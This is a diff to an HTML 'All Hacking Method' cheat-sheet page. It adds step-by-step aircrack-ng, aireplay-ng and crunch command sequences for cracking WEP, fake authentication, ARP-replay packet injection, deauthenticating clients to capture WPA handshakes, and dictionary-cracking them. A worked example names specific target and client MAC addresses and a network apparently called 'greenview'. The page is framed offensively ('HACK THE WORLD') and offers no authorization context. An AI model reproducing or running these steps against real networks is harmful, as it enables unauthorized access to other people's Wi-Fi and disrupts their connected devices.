@@ -33,7 +33,9 @@
 </head>
 <body bgcolor="Black">
 
+
   <h2><center> <font color=white>All Hacking Method By <a href="https://t1m3-30m3.github.io/ABOUTME/" style="text-decoration: none;color:red;">Zaber Mahmud Asif</a></font></center></h2>
+  
 
 <h3> <font color=white> Dear Hackers!! Welcome to this Site. This is Mainly all Attack Describe. So You Can Learn Lots os Things.If you want to Work with us.Contact with ME.</font></h3>
 <h4><center> <font color=white>HACK THE WORLD!! OTHERWISE YOU WERE HACKED BY OTHERS.</font></center></h4>
@@ -126,14 +128,100 @@ i     wconfig<br>
     </p>
 </div>
 
-<button class="collapsible">#</button>
+<button class="collapsible">How to Show Kali Own Mac Address</button>
 <div class="content">
-  <p><b>#
+  <p>sudo macchanger -s eth0 </p>
+</div>
+
+<button class="collapsible">WEP CRACKING</button>
+<div class="content">
+  <p> [interface] >> wlan0mon/wlan0<br>
+
+    ifconfig<br>
+    airmon-ng start [interface]<br>
+    iwconfig<br>
+    airodump-ng [interface]<br>
+    airodump-ng --channel [channel] --bssid [bssid] --write [file Name] <interface><br>
+    open a new ternimal and type<br>
+    aircrack-ng "cap file path"<br>
+    [remove the semi Colon]<br>
     </p>
 </div>
 
+<button class="collapsible">WEP cracking -Fake Auth</button>
+<div class="content">
+  <p>
+    [interface] >> wlan0mon/wlan0<br>
+
+      airmon-ng start [interface]<br>
+      iwconfig<br>
+      airodump-ng [interface]<br>
+      airodump-ng --channel [channel] --bssid [bssid] --write [file Name] [interface]<br>
+      aireplay-ng --fakeauth 0 -a [target Mac] -h [kali mac] [interface]<br>
 
 
+    </p>
+</div>
+
+<button class="collapsible">Packet Injection</button>
+<div class="content">
+  <p>
+    airmon-ng start [interface]<br>
+    iwconfig<br>
+    airodump-ng [interface]<br>
+    airodump-ng --channel [channel] --bssid [bssid] --write [file Name] [interface]<br>
+    [open a New Terminal]<br>
+    aireplay-ng --fakeauth 0 -a [target Mac] -h [kali mac] [interface]<br>
+    aireplay-ng --arpreplay 0 -b [target Mac] -h [kali mac] [interface]<br>
+    [open a New Terminal]<br>
+    aireplay-ng --fakeauth 0 -a [target Mac] -h [kali mac] [interface]<br>
+    [open a New Terminal]<br>
+    aircrack-ng "cap file path"<br>
+      
+    </p>
+</div>
+
+<button class="collapsible">How to Hack Wifi</button>
+<div class="content">
+  <p>
+iwconfig<br>
+ifconfig wlan0 down<br>
+ifconfig wlan0 up<br>
+airmon-ng check kill<br>
+airmon-ng start wlan0<br>
+airodump-ng wlan0<br>
+airodump-ng --bssid [MAC] --channel [CH] --write Filename wlan0<br>
+aireplay-ng --deauth 0 -a [MAC] -c [Client_MAC] wlan0<br>
+[Restart Your Vmware]<br>
+aircrack-ng "cap file path" -w "pass file" wlan0<br>
+
+Example::<br>
+airodump-ng --bssid 18:D6:C7:ED:62:D2 --channel 4 --write greenview wlan0<br>
+aireplay-ng --deauth 0 -a 18:D6:C7:ED:62:D2 -c EA:34:66:22:F7:D2 wlan0<br>
+aircrack-ng "/home/kali/greenview-01.cap" -w "/home/kali/Desktop/rockyou.txt" wlan0<br>
+ </p>
+</div>
+
+<button class="collapsible">Create A Password List</button>
+<div class="content">
+  <p>
+    crunch [min] [max] [char] -t [pattern] -o file<br>
+    </p>
+</div>
+
+<button class="collapsible">#</button>
+<div class="content">
+  <p>
+    #   
+    </p>
+</div>
+
+<button class="collapsible">#</button>
+<div class="content">
+  <p>
+    #  
+    </p>
+</div>
 
 <script>
 var coll = document.getElementsByClassName("collapsible");
